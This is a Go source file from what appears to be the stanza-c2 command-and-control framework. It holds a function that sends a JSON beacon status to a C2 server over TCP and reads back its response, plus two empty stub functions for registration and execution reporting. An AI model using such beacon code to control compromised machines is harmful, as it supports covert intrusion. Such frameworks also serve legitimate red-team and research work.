package main

import (
	"encoding/json"
	"io"
	"net"

	"github.com/jmpsec/stanza-c2/pkg/types"
)

// Function to send a beacon to the C2 using TCP socket and IPv4
func sendTCPv4Beacon(service string, data types.StzBeaconStatus) (types.StzBeaconResponse, error) {
	// Resolve service
	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Attempt TCP connection
	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Serialize data
	jsonOut, err := json.Marshal(data)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Send data
	_, err = conn.Write(jsonOut)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Get response
	resp, err := io.ReadAll(conn)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Parse response
	var rData types.StzBeaconResponse
	err = json.Unmarshal(resp, &rData)
	if err != nil {
		return types.StzBeaconResponse{}, err
	}
	// Return response
	return rData, nil
}

// Function to register a client in the C2 using TCP socket and IPv4
func registerTCPv4Client() error {
	return nil
}

// Function to send an execution status to the C2 using TCP socket and IPv4
func sendTCPv4Execution() error {
	return nil
}
